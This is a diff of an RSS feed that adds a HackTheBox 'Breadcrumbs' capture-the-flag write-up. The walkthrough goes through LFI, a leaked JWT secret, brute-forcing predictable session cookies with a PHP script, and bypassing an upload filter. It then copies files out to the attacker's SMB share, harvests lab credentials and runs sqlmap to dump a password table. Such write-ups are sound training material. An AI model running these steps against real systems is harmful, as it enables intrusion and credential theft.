@@ -5,12 +5,251 @@
     <link>https://mohamed-elleuch.me/writeups/</link>
       <atom:link href="https://mohamed-elleuch.me/writeups/index.xml" rel="self" type="application/rss+xml" />
     <description>Writeups</description>
-    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 10 Jul 2021 00:00:00 +0000</lastBuildDate>
+    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 17 Jul 2021 00:00:00 +0000</lastBuildDate>
     <image>
       <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
       <title>Writeups</title>
       <link>https://mohamed-elleuch.me/writeups/</link>
     </image>
+    
+    <item>
+      <title>HackTheBox - Breadcrumbs Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-breadcrumbs/</link>
+      <pubDate>Sat, 17 Jul 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-breadcrumbs/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.228 -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
+|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
+|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
+80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
+|_http-title: Library
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We have 6 ports open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;SSH&lt;/li&gt;
+&lt;li&gt;Webserver 80/443&lt;/li&gt;
+&lt;li&gt;SMB&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreenweb-enumeration-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Enumeration &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s take a loot at both ports 80/443, but seems they both give us the same pages! We can work one of these&lt;/p&gt;
+&lt;img src=&#34;e-book.png&#34;&gt;
+&lt;p&gt;Seems like it&amp;rsquo;s an e-book library&lt;/p&gt;
+&lt;img src=&#34;eth.png&#34;&gt;
+&lt;p&gt;We have a search page for books, let&amp;rsquo;s try to play with it a bit&lt;/p&gt;
+&lt;img src=&#34;ethtest.png&#34;&gt;
+&lt;p&gt;I tried few manual enumeration but nothing seem to give me an interesting output!&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s capture the request with burpsuite to see what&amp;rsquo;s actually going on&lt;/p&gt;
+ &lt;img src=&#34;LFI1.png&#34;&gt;
+&lt;p&gt;Aside from the title and author parameters we have &amp;ldquo;method=0&amp;rdquo; which seems odd&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s first send the request to repeater and change &amp;ldquo;method=1&amp;rdquo;&lt;/p&gt;
+ &lt;img src=&#34;LFI21.png&#34;&gt;
+ &lt;img src=&#34;LFI22.png&#34;&gt;
+&lt;p&gt;We get a different and an interesting response which screams &amp;ldquo;local file inclusion&amp;rdquo; that also leaks the parameter &amp;ldquo;book&amp;rdquo;, let&amp;rsquo;s check if that works&lt;/p&gt;
+ &lt;img src=&#34;LFI3.png&#34;&gt;
+&lt;p&gt;And yes! We have an LFI, let&amp;rsquo;s keep enumerating we don&amp;rsquo;t really have anything interesting to read yet&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gobuster dir -u http://10.10.10.228/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x asp,aspx,php
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;-x prefix for adding extensions when fuzzing , since we&amp;rsquo;re working on windows box we may find asp/x files
+Also chose the lowercase version of raft-directories because windows is key sensitive,&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;gob.png&#34;&gt;
+&lt;p&gt;Seems like we have a login panel&lt;/p&gt;
+&lt;img src=&#34;login.png&#34;&gt;
+&lt;p&gt;Since we&amp;rsquo;re looking for files to read we&amp;rsquo;re not gonna try to do stuff with the login panel! Let&amp;rsquo;s run gobuster again&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gobuster dir -u http://10.10.10.228/portal -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x asp,aspx,php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;gob1.png&#34;&gt;
+Let&#39;s check all of these
+&lt;p&gt;&lt;code&gt;/includes/&lt;/code&gt;
+&lt;img src=&#34;include.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/php/&lt;/code&gt;
+&lt;img src=&#34;files.png&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;users.png&#34;&gt;
+Here we have a list of users, Let&#39;s take note of them first and save them somewhere in case we needed users later
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorredfoothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Let&amp;rsquo;s not waste more time and check the files under /includes/ and also the cookie.php under /portal/ with our LFI&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;include/fileController.php&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;filecont.png&#34;&gt;
+&lt;p&gt;We get the JWT secret&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$secret_key = &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Another interesting thing in the response&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if(in_array($user, $admins) &amp;amp;&amp;amp; $_SESSION[&#39;username&#39;] == \&amp;quot;paul\&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seems like we need to login as the user paul&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s check &lt;code&gt;Cookie.php&lt;/code&gt;
+&lt;img src=&#34;cookie.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If we clean the response, a quick sed to remove the &amp;ldquo;\r \n and &amp;quot;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+/** * @param string $username  Username requesting session cookie * 
+* @return string $session_cookie Returns the generated cookie *
+* @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. 
+*CHANGE SECOND PART OF MD5 KEY EVERY WEEK **/
+
+  function makesession($username){    
+  	$max = ;    
+  	$seed = rand(0, $max);    
+  	$key = &amp;quot;s4lTy_stR1nG_&amp;quot;.$username[$seed].&amp;quot;(!528./9890&amp;quot;;    
+  	$session_cookie = $username.md5($key);    
+  	return $session_cookie;}
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We know that the user is &amp;ldquo;paul&amp;rdquo; which is a short username, we can generate all the possible cookies and try them until one works&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$user=&amp;quot;paul&amp;quot;;
+for ($seed = 0; $seed &amp;lt;= strlen($user) - 1; $seed++) {
+	$key = &amp;quot;s4lTy_stR1nG_&amp;quot;.$user[$seed].&amp;quot;(!528./9890&amp;quot;;  
+	$session_cookie = $user.md5($key);
+	echo &amp;quot;[+] Cookie : &amp;quot;.$session_cookie.&amp;quot;\n&amp;quot;;
+  
+};
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;cok.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s try them one by one and check if we can get in&lt;/p&gt;
+&lt;img src=&#34;adm1.png&#34;&gt;
+&lt;img src=&#34;adm.png&#34;&gt;
+&lt;p&gt;And we&amp;rsquo;re in!&lt;/p&gt;
+&lt;p&gt;Nothing interesting in the Issues page&lt;/p&gt;
+&lt;img src=&#34;Issues.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s check the File management page&lt;/p&gt;
+&lt;img src=&#34;file.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s try to upload anything to see if it works&lt;/p&gt;
+&lt;img src=&#34;token.png&#34;&gt;
+&lt;p&gt;Seems like we need a token! We have the secret, but we forgot to check what data we should provide!
+Let&amp;rsquo;s check the response back&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ret = JWT::decode($jwt, $secret_key, array(&#39;HS256&#39;)); 
+return $ret;
+if($_SERVER[&#39;REQUEST_METHOD&#39;] === \&amp;quot;POST\&amp;quot;){
+  $admins = array(\&amp;quot;paul\&amp;quot;);
+  $user = validate()-&amp;gt;data-&amp;gt;username;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;According to this response the content of JWT token should be&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&amp;quot;data&amp;quot;:{&amp;quot;username&amp;quot;:&amp;quot;paul&amp;quot;}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we have everything we need let&amp;rsquo;s forge our token, we can either use python or jwt.io&lt;/p&gt;
+&lt;img src=&#34;jwt.png&#34;&gt;
+&lt;pre&gt;&lt;code&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s add the cookie to our browser&lt;/p&gt;
+&lt;img src=&#34;newjwt.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s to import anything&lt;/p&gt;
+&lt;img src=&#34;succ.png&#34;&gt;
+&lt;p&gt;It worked!&lt;/p&gt;
+&lt;p&gt;As the page mentions, we can only upload .zip files, after few attempts it seems that it&amp;rsquo;s client-side filter that checks the content type&lt;/p&gt;
+&lt;p&gt;we can bypass it by simply capturing the request with burp and change the &amp;ldquo;Content-Type&amp;rdquo; Header to application/zip&lt;/p&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;p&gt;And we&amp;rsquo;re in&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorredjuliette-user-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Juliette User PrivESC &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;As usual, before running any enumeration tool we can check the webpage source to see if something is hidden there!&lt;/p&gt;
+&lt;p&gt;We can see an interesting folder under the /portal/&lt;/p&gt;
+&lt;img src=&#34;data.png&#34;&gt;
+&lt;img src=&#34;userdata.png&#34;&gt;
+&lt;p&gt;We have few files for users,
+Let&amp;rsquo;s check if they contains any password&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Get-ChildItem | Select-String &#39;password&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;userflag.png&#34;&gt;
+&lt;p&gt;And we get creds for user juliette&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;juliette:jUli901./())!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s try to ssh into the box with these creds&lt;/p&gt;
+&lt;img src=&#34;userf.png&#34;&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorreddevelopment-user-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Development User PrivESC &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;In juliette&amp;rsquo;s Desktop we can find an interesting file &lt;code&gt;todo.html&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;todo1.png&#34;&gt;
+&lt;img src=&#34;todo2.png&#34;&gt;
+&lt;p&gt;Seems like we need to get the passwords that are stored in the stickynotes! According to google they should located under the %appdata% folder&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Get-ChildItem *Sticky* -Recurse
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;sticky.png&#34;&gt;
+&lt;p&gt;We found a directory!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;C:\users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It contains more folders, the \LocalState\ seems interesting!
+&lt;img src=&#34;state.png&#34;&gt;
+Let&amp;rsquo;s copy these files to our machine!
+Fist we start our smbserver&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.6 -smb2support euch .
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and copy these files!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;copy * \\10.10.14.6\euch
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;smb.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s check the files! the only interesting file we need is &lt;code&gt;plum.sqlite-wal&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;It contains  the creds for the development user&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s try to ssh with these creds
+&lt;img src=&#34;sshdev.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-user-privesc-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root User PrivESC &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Now we&amp;rsquo;re logged in as development, we can check what&amp;rsquo;s inside &lt;code&gt;C:\Development\&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;ff.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s copy it to our machine&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;copy Krypter_Linux \\10.10.14.6\euch
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;kryp.png&#34;&gt;
+It&#39;s a Linux executable, before going deeper in the binary it&#39;s better to run strings or rabin2 -z to extract the printable strings in the binary!
+&lt;img src=&#34;rabin.png&#34;&gt;
+&lt;p&gt;What seems odd when you see the output is the port 1234!&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://passmanager.htb:1234/index.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Also we have the GET parameters&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;method=select&amp;amp;username=administrator&amp;amp;table=passwords
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seems like it&amp;rsquo;s running locally!&lt;/p&gt;
+&lt;img src=&#34;local.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s forward it to our machine with ssh&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh -L 1234:127.0.0.1:1234 development@10.10.10.228
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;for.png&#34;&gt;
+&lt;p&gt;The parameters names gives us a hint that it&amp;rsquo;s SQL injection
+let&amp;rsquo;s use sqlmap&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sqlmap -u &amp;quot;http://127.0.0.1:1234/?method=select&amp;amp;username=administrator&amp;amp;table=passwords&amp;quot; --dump
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;us.png&#34;&gt;
+&lt;img src=&#34;AES.png&#34;&gt;
+&lt;p&gt;We get the administrator&amp;rsquo;s password but it&amp;rsquo;s encrypted (AES)&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s use cyberchef to decrypt it&lt;/p&gt;
+&lt;img src=&#34;root.png&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;When i first did the machine, I overthinked this part,  I thought that i needed to to find IV somewhere in the machine &lt;Wasted a lot of time trying to find it&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And now let&amp;rsquo;s try to ssh into the box as the administrator and grab the flag!&lt;/p&gt;
+&lt;img src=&#34;rooted.png&#34;&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
     
     <item>
       <title>HackTheBox - Atom Writeup</title>
